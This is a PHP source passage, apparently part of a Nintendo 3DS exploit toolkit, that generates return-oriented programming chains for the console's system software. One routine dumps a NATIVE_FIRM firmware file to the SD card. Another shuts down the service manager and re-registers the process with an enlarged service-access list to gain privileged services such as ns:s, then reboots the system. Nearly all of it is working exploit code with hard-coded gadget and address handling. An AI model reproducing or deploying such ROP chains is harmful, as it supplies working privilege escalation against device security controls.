	$ROPCHAIN.= genu32_unicode(0x0);//r5
	$ROPCHAIN.= genu32_unicode(0x0);//r6

	$ROPCHAIN.= genu32_unicode($svcSleepThread);

	ropgen_writeu32($ROPHEAP, 0x01FFFFFF, 0, 1);
	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $ROP_POP_R0R6PC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that white is displayed.

	$ROPCHAIN.= genu32_unicode($LINEAR_TMPBUF);//r0
	$ROPCHAIN.= genu32_unicode(0x0);//r1
	$ROPCHAIN.= genu32_unicode(0x0);//r2
	$ROPCHAIN.= genu32_unicode(0x0);//r3
	$ROPCHAIN.= genu32_unicode(0x0);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5
	$ROPCHAIN.= genu32_unicode(0x0);//r6

	$ROPCHAIN.= genu32_unicode($POPLRPC);
	$ROPCHAIN.= genu32_unicode($POPPC);

	$ROPCHAIN.= genu32_unicode($CODESTART_MAPADR);

	$ROPCHAIN.= genu32_unicode(0x70707070);
}

function generateropchain_type3()
{
	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $READ_EXEFSFILE, $OPENFILEDIRECTLY_WRAP, $FSFILEIPC_CLOSE, $FSFILEIPC_GETSIZE, $FSFILEIPC_READ, $GSP_WRITEHWREGS;

	$IFile_ctx = $ROPHEAP+0x80;
	$FILEBUF = 0x18B40000 - 0x00200000-8;

	ropgen_writeu32($ROPHEAP, 0x010000FF, 0, 1);
	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that red is displayed.

	ropgen_callfunc($FILEBUF, 0x00200000+8, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);

	ropgen_callfunc($IFile_ctx, 0x14, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);//Clear the IFile ctx.

	$databuf = array();
	$databuf[0] = 0x640073;//utf16 string: "sdmc:/dump.bin"
	$databuf[1] = 0x63006d;
	$databuf[2] = 0x2f003a;
	$databuf[3] = 0x750064;
	$databuf[4] = 0x70006d;
	$databuf[5] = 0x62002e;
	$databuf[6] = 0x6e0069;
	$databuf[7] = 0x00;
	$databuf[8] = 0x00000002;//archive lowpath data: programID low/high, u8 mediatype, u32 reserved (NATIVE_FIRM)
	$databuf[9] = 0x00040138;
	$databuf[10] = 0x00000000;
	$databuf[11] = 0x00000000;
	$databuf[12] = 0x0;//file lowpath data
	$databuf[13] = 0x0;
	$databuf[14] = 0x2;
	$databuf[15] = 0x7269662e;//".firm"
	$databuf[16] = 0x6d;
	$databuf[17] = 0x2;//archive lowpath*
	$databuf[18] = $ROPHEAP+0x100+0x20;
	$databuf[19] = 0x10;
	$databuf[20] = 0x2;//file lowpath*
	$databuf[21] = $ROPHEAP+0x100+0x20+0x10;
	$databuf[22] = 0x14;

	ropgen_writeregdata_wrap($ROPHEAP+0x100, $databuf, 0, 0x5c);//Write the above data to ROPHEAP+0x100.

	ropgen_callfunc($ROPHEAP+0xc0, 0x2345678A, $ROPHEAP+0x100+0x44, $ROPHEAP+0x100+0x44+0xc, $POPPC, $OPENFILEDIRECTLY_WRAP);

	/*$ROPCHAIN.= genu32_unicode($POPLRPC);
	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);

	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
	$ROPCHAIN.= genu32_unicode($FILEBUF);//r0 outbuf*
	$ROPCHAIN.= genu32_unicode(0x000e8000);//r1 readsize
	$ROPCHAIN.= genu32_unicode(0x2);//r2 archive lowpathtype
	$ROPCHAIN.= genu32_unicode($ROPHEAP+0x100+0x20);//r3 archive lowpath data*
	$ROPCHAIN.= genu32_unicode(0x0);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5
	$ROPCHAIN.= genu32_unicode(0x0);//r6

	$ROPCHAIN.= genu32_unicode($READ_EXEFSFILE);//Write the data @ $FILEBUF to the file.

	$ROPCHAIN.= genu32_unicode(0x10);//sp0(archive lowpath datasize) / r1
	$ROPCHAIN.= genu32_unicode($ROPHEAP+0x100+0x20+0x10);//sp4(ptr to 8-byte exefs filename) / r2
	$ROPCHAIN.= genu32_unicode(0x0);//r3
	$ROPCHAIN.= genu32_unicode(0x8);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5*/

	//$ROPCHAIN.= genu32_unicode(0x24242424);
	ropgen_condfatalerr();

	ropgen_callfunc($ROPHEAP+0xc0, $FILEBUF, 0x0, 0x0, $POPPC, $FSFILEIPC_GETSIZE);//Load the filesize to $FILEBUF+0.

	//$ROPCHAIN.= genu32_unicode(0x34343434);
	ropgen_condfatalerr();

	ropgen_writeu32($FILEBUF-4, $FILEBUF+8, 0, 1);

	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
	$ROPCHAIN.= genu32_unicode($ROPHEAP+0xc0);//r0 handle*
	$ROPCHAIN.= genu32_unicode(0x0);//r1 unused
	$ROPCHAIN.= genu32_unicode(0x0);//r2 offset low
	$ROPCHAIN.= genu32_unicode(0x0);//r3 offset high
	$ROPCHAIN.= genu32_unicode($FILEBUF-4);//r4 ptr to the following: +0 = databuf, +4 = datasize
	$ROPCHAIN.= genu32_unicode($ROPHEAP+0xd0);//r5 transfercount*
	$ROPCHAIN.= genu32_unicode(0x0);//r6

	$ROPCHAIN.= genu32_unicode($FSFILEIPC_READ+0xc);

	$ROPCHAIN.= genu32_unicode(0x0);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5
	$ROPCHAIN.= genu32_unicode(0x0);//r6

	//$ROPCHAIN.= genu32_unicode(0x74747474);
	ropgen_condfatalerr();

	ropgen_callfunc($ROPHEAP+0xc0, 0x0, 0x0, 0x0, $POPPC, $FSFILEIPC_CLOSE);

	ropgen_callfunc($IFile_ctx, $ROPHEAP+0x100, 0x6, 0x0, $POPPC, $IFile_Open);//Open the above file for writing.
	ropgen_condfatalerr();

	$ROPCHAIN.= genu32_unicode($POPLRPC);
	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);

	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
	$ROPCHAIN.= genu32_unicode($IFile_ctx);//r0 filectx
	$ROPCHAIN.= genu32_unicode($ROPHEAP+0x20);//r1 transfercount*
	$ROPCHAIN.= genu32_unicode($FILEBUF);//r2 buf*
	$ROPCHAIN.= genu32_unicode(0x00200000+8);//r3 size
	$ROPCHAIN.= genu32_unicode(0x0);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5
	$ROPCHAIN.= genu32_unicode(0x0);//r6

	$ROPCHAIN.= genu32_unicode($IFile_Write);//Write the data @ $FILEBUF to the file.

	$ROPCHAIN.= genu32_unicode(0x1);//sp0(flushflag) / r1
	$ROPCHAIN.= genu32_unicode(0x0);//r2
	$ROPCHAIN.= genu32_unicode(0x0);//r3
	$ROPCHAIN.= genu32_unicode(0x8);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5

	ropgen_condfatalerr();

	ropgen_readu32($IFile_ctx, 0, 1);

	$ROPCHAIN.= genu32_unicode($POPLRPC);
	$ROPCHAIN.= genu32_unicode($POPPC);//lr
	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);

	$ROPCHAIN.= genu32_unicode(0x0);//r1
	$ROPCHAIN.= genu32_unicode(0x0);//r2
	$ROPCHAIN.= genu32_unicode(0x0);//r3
	$ROPCHAIN.= genu32_unicode(0x0);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5
	$ROPCHAIN.= genu32_unicode($IFile_Close);

	ropgen_writeu32($ROPHEAP, 0x01FF0000, 0, 1);
	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that blue is displayed.

	$ROPCHAIN.= genu32_unicode(0x70707070);
}

function generateropchain_type4()
{
	global $ROPHEAP, $ROPCHAIN, $ROP_INFINITELP, $POPPC, $POPLRPC, $ROP_POP_R0R6PC, $ROP_POP_R0R8PC, $ROP_STR_R1TOR0, $ROP_POP_R0PC, $SRVPORT_HANDLEADR, $srv_shutdown, $svcGetProcessId, $srv_GetServiceHandle, $srvpm_initialize, $SRV_REFCNT, $ROP_MEMSETOTHER;

	//$ROPCHAIN.= genu32_unicode(0x40404040);
	//$ROPCHAIN.= genu32_unicode(0x80808080);

	ropgen_writeu32($SRV_REFCNT, 1, 0, 1);//Set the srv reference counter to value 1, so that the below function calls do the actual srv shutdown and "srv:pm" initialization.

	ropgen_callfunc(0, 0, 0, 0, $POPPC, $srv_shutdown);
	ropgen_condfatalerr();

	ropgen_callfunc(0, 0, 0, 0, $POPPC, $srvpm_initialize);
	ropgen_condfatalerr();

	ropgen_writeu32_cmdbuf(0, 0x04040040);//Write the cmdhdr.
	ropgen_write_procid_cmdbuf(1);//Write the current processid to cmdbuf+4.

	ropgen_sendcmd($SRVPORT_HANDLEADR, 1);//Unregister the current process with srvpm.

	$databuf = array();

	$databuf[0x0*2 + 0] = 0x3a545041;//"APT:U"
	$databuf[0x0*2 + 1] = 0x00000055;
	$databuf[0x1*2 + 0] = 0x3a723279;//"y2r:u"
	$databuf[0x1*2 + 1] = 0x00000075;
	$databuf[0x2*2 + 0] = 0x3a707367;//"gsp::Gpu"
	$databuf[0x2*2 + 1] = 0x7570473a;
	$databuf[0x3*2 + 0] = 0x3a6d646e;//"ndm:u"
	$databuf[0x3*2 + 1] = 0x00000075;
	$databuf[0x4*2 + 0] = 0x553a7366;//"fs:USER"
	$databuf[0x4*2 + 1] = 0x00524553;
	$databuf[0x5*2 + 0] = 0x3a646968;//"hid:USER"
	$databuf[0x5*2 + 1] = 0x52455355;
	$databuf[0x6*2 + 0] = 0x3a707364;//"dsp::DSP"
	$databuf[0x6*2 + 1] = 0x5053443a;
	$databuf[0x7*2 + 0] = 0x3a676663;//"cfg:u"
	$databuf[0x7*2 + 1] = 0x00000075;
	$databuf[0x8*2 + 0] = 0x703a7370;//"ps:ps"
	$databuf[0x8*2 + 1] = 0x00000073;
	$databuf[0x9*2 + 0] = 0x733a736e;//"ns:s"
	$databuf[0x9*2 + 1] = 0x00000000;
	$databuf[0xa*2 + 0] = 0x00000000;
	$databuf[0xa*2 + 1] = 0x00000000;
	$databuf[0xb*2 + 0] = 0x00000000;
	$databuf[0xb*2 + 1] = 0x00000000;

	ropgen_writeregdata_wrap($ROPHEAP+0x100, $databuf, 0, 0x60);

	ropgen_writeu32_cmdbuf(0, 0x04030082);
	ropgen_write_procid_cmdbuf(1);//Write the current processid to cmdbuf+4.
	ropgen_writeu32_cmdbuf(2, 0x18);
	ropgen_writeu32_cmdbuf(3, 0x180002);
	ropgen_writeu32_cmdbuf(4, $ROPHEAP+0x100);

	ropgen_sendcmd($SRVPORT_HANDLEADR, 1);//Re-register the current process with srvpm with a new service-access-control list.

	ropgen_callfunc($ROPHEAP+0xc, $ROPHEAP + 0x100 + 0x9*8, 4, 0, $POPPC, $srv_GetServiceHandle);//Get the service handle for "ns:s", out handle is @ $ROPHEAP+0xc.
	ropgen_condfatalerr();

	ropgen_writeu32_cmdbuf(0, 0x00100180);
	ropgen_writeu32_cmdbuf(1, 1);//flag=1 for titleinfo is set.
	ropgen_writeu32_cmdbuf(2, 0);//programID-low
	ropgen_writeu32_cmdbuf(3, 0);//programID-high
	ropgen_writeu32_cmdbuf(4, 2);//mediatype
	ropgen_writeu32_cmdbuf(5, 0);//reserved
	ropgen_writeu32_cmdbuf(6, 0);//u8

	ropgen_sendcmd($ROPHEAP+0xc, 0);//NSS:RebootSystem

	$ROPCHAIN.= genu32_unicode(0x50505050);
}

?>